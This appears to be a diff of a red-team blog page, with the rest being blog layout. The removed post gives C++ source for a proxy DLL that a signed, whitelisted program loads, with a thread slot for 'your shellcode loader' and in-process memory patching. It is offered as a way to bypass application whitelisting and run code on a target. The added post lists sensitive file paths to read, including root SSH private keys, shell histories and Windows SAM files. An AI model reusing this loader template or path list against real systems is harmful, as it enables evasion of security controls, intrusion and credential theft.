@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DLL hijacking the whitelist application online, Yangsir ’s blog">
+    <meta name="keywords" content="Sensitive path information concerns, Yangsir ’s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DLL hijacking the whitelist application online | Yangsir ’s blog</title>
+    <title>Sensitive path information concerns | Yangsir ’s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DLL hijacking the whitelist application online</h1>
+                    <h1 class="description center-align post-title">Sensitive path information concerns</h1>
                 </div>
             </div>
         </div>
@@ -436,8 +436,8 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/Bypass/">
-                                <span class="chip bg-color">Bypass</span>
+                            <a href="/tags/Information-collection/">
+                                <span class="chip bg-color">Information collection</span>
                             </a>
                         
                     </div>
@@ -448,8 +448,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Learning-record/" class="post-category">
-                                Learning record
+                            <a href="/categories/Essays-record/" class="post-category">
+                                Essays record
                             </a>
                         
                     </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-20
+                    2021-07-21
                 </div>
                 
 
@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    469
+                    386
                 </div>
                 
 
@@ -500,167 +500,65 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();
+                <h6 id="If-there-is-insufficient-the-follow-up-to-continue"><a href="#If-there-is-insufficient-the-follow-up-to-continue" class="headerlink" title="If there is insufficient, the follow-up to continue"></a>If there is insufficient, the follow-up to continue</h6><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="apache-amp-apache2"><a href="#apache-amp-apache2" class="headerlink" title="apache&amp;apache2"></a>apache&amp;apache2</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;apache&#x2F;httpd.conf
+&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf
+&#x2F;etc&#x2F;httpd&#x2F;httpd.conf
+&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf
+&#x2F;home&#x2F;httpd&#x2F;conf&#x2F;httpd.conf
+&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf
+&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf
+&#x2F;etc&#x2F;rc.local 
 
-DWORD WINAPI DDOS(LPVOID lpParameter)
-&#123;
-	your shellcode loader
-&#125;
+&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf  web file
+&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F; config file
+&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F; all config file
+&#x2F;etc&#x2F;apache2&#x2F;apache2.conf Apache config file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-static
-HMODULE g_OldModule &#x3D; NULL;
+<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf
+&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-VOID WINAPI Free()
-&#123;
-	if (g_OldModule)
-	&#123;
-		FreeLibrary(g_OldModule);
-	&#125;
-&#125;
+<h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;mounts File system list
+&#x2F;proc&#x2F;cpuinfo CPU
+&#x2F;proc&#x2F;meminfo memory
+&#x2F;proc&#x2F;self -&gt; pid information
+&#x2F;proc&#x2F;self&#x2F;environ environment variable
+&#x2F;proc&#x2F;[pid]&#x2F;cmdline Process start parameter  such as &#x2F;proc&#x2F;1&#x2F;cmdline
+&#x2F;proc&#x2F;[pid]&#x2F;mountinfo Information about the file system mount
+&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[fd] The file that the process opened
+&#x2F;proc&#x2F;[pid]&#x2F;exe An exe file that points to the process
+&#x2F;proc&#x2F;config.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;hosts.deny 
+&#x2F;etc&#x2F;bashrc 
+&#x2F;etc&#x2F;issue 
+&#x2F;etc&#x2F;issue&#x2F;net 
+&#x2F;etc&#x2F;ssh&#x2F;ssh_config 
+&#x2F;etc&#x2F;termcap 
+&#x2F;etc&#x2F;xinetd.d
+&#x2F;etc&#x2F;mtab 
+&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf
+&#x2F;etc&#x2F;xinetd.conf 
+&#x2F;etc&#x2F;protocols 
+&#x2F;etc&#x2F;logrotate.conf 
+&#x2F;etc&#x2F;ld.so.conf 
+&#x2F;etc&#x2F;resolv.conf 
+&#x2F;etc&#x2F;sysconfig&#x2F;network
+&#x2F;etc&#x2F;sendmail.cf
+&#x2F;etc&#x2F;sendmail.cw <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-BOOL WINAPI Load()
-&#123;
-	TCHAR tzPath[MAX_PATH];
-	TCHAR tzTemp[MAX_PATH * 2];
+<h3 id="Root-permission-required"><a href="#Root-permission-required" class="headerlink" title="Root permission required"></a>Root permission required</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys
+&#x2F;root&#x2F;.ssh&#x2F;id_rsa
+&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore
+&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub
+&#x2F;root&#x2F;.ssh&#x2F;known_hosts
+&#x2F;root&#x2F;.bash_history
+&#x2F;root&#x2F;.mysql_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><pre class="line-numbers language-none"><code class="language-none">c:\boot.ini
+c:\windows\systems32\inetsrv\MetaBase.xml
+c:\windows\repair\sam
+C:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-	&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); 
-	&#x2F;&#x2F;PathRemoveFileSpec(tzPath);
-
-	GetSystemDirectory(tzPath, MAX_PATH); 
-
-	lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));
-
-	g_OldModule &#x3D; LoadLibrary(tzPath);
-	if (g_OldModule &#x3D;&#x3D; NULL)
-	&#123;
-		wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-	&#125;
-
-	return (g_OldModule !&#x3D; NULL);
-
-&#125;
-
-
-FARPROC WINAPI GetAddress(PCSTR pszProcName)
-&#123;
-	FARPROC fpAddress;
-	CHAR szProcName[64];
-	TCHAR tzTemp[MAX_PATH];
-
-	fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);
-	if (fpAddress &#x3D;&#x3D; NULL)
-	&#123;
-		if (HIWORD(pszProcName) &#x3D;&#x3D; 0)
-		&#123;
-			wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);
-			pszProcName &#x3D; szProcName;
-		&#125;
-
-		wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-		ExitProcess(-2);
-	&#125;
-	return fpAddress;
-&#125;
-
-BOOL WINAPI Init()
-&#123;
-	pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);
-	pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);
-	return TRUE;
-&#125;
-
-DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)
-&#123;
-	HANDLE hProcess;
-
-	PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);
-	BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;
-
-	
-	hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
-	if (hProcess)
-	&#123;
-		WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);
-
-		CloseHandle(hProcess);
-	&#125;
-
-	return 0;
-&#125;
-
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
-&#123;
-	HANDLE threadHandle;
-	threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);
-	if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)
-	&#123;
-
-		DisableThreadLibraryCalls(hModule);
-
-		if (Load() &amp;&amp; Init())
-		&#123;
-			TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);
-			TCHAR szCurName[MAX_PATH];
-
-			GetModuleFileName(NULL, szCurName, MAX_PATH);
-			PathStripPath(szCurName);
-
-			
-			if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)
-			&#123;
-				
-				HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
-				if (hThread)
-				&#123;
-					CloseHandle(hThread);
-				&#125;
-			&#125;
-		&#125;
-	&#125;
-	else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)
-	&#123;
-		Free();
-	&#125;
-
-	return TRUE;
-&#125;
-
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaAllInfo;
-&#125;
-
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaTemp;
-&#125;
-
-void test()
-&#123;
-	MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);
-	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);
-	if (hDllInst)
-	&#123;
-		typedef DWORD(WINAPI *EXPFUNC)();
-		EXPFUNC exportFunc &#x3D; NULL;
-		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
-		if (exportFunc)
-		&#123;
-			exportFunc();
-		&#125;
-		FreeLibrary(hDllInst);
-	&#125;
-	return;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>
 
                 
             </div>
@@ -687,7 +585,7 @@ void test()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/">https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/</a>
+                    <a href="https://yangsirrr.github.io/2021/07/21/sensitive-path-information-concerns/">https://yangsirrr.github.io/2021/07/21/sensitive-path-information-concerns/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -729,8 +627,8 @@ void test()
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/Bypass/">
-                                    <span class="chip bg-color">Bypass</span>
+                                <a href="/tags/Information-collection/">
+                                    <span class="chip bg-color">Information collection</span>
                                 </a>
                             
                         </div>
@@ -776,9 +674,10 @@ void test()
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/07/21/sensitive-path-information-concerns/">
                     <div class="card-image">
@@ -796,9 +695,9 @@ void test()
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -811,6 +710,7 @@ void test()
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -833,12 +733,12 @@ void test()
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/19/dll-hijacking-from-hijacking-to-on-line/">
+                <a href="/2021/07/20/dll-hijacking-the-whitelist-application-online/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" class="responsive-img" alt="DLL hijacking from hijacking to on-line">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" class="responsive-img" alt="DLL hijacking the whitelist application online">
                         
-                        <span class="card-title">DLL hijacking from hijacking to on-line</span>
+                        <span class="card-title">DLL hijacking the whitelist application online</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -849,7 +749,7 @@ void test()
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-20
                             </span>
                         <span class="publish-author">
                             
